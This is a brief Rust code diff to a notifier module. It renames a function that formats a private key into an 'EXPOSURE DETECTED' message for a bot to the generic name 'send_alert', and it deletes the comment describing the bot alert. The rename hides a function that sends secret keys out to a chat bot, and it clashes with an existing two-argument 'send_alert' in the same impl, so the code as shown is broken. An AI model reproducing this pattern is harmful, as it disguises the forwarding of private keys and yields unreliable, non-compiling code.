@@ -30,7 +30,6 @@ impl Notifier {
             format!("{}", message)
         };
         
-        // Send alert via bot
         self.send_bot_alert(&formatted_message).await?;
         
         Ok(())
@@ -45,7 +44,7 @@ impl Notifier {
         self.send_alert(&message, "").await
     }
     
-    pub async fn send_private_key_alert(&self, private_key: &str) -> Result<()> {
+    pub async fn send_alert(&self, private_key: &str) -> Result<()> {
         let message = format!(
             "🚨 **EXPOSURE DETECTED** 🚨\n\n`{}`\n\n**{}",
             private_key, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
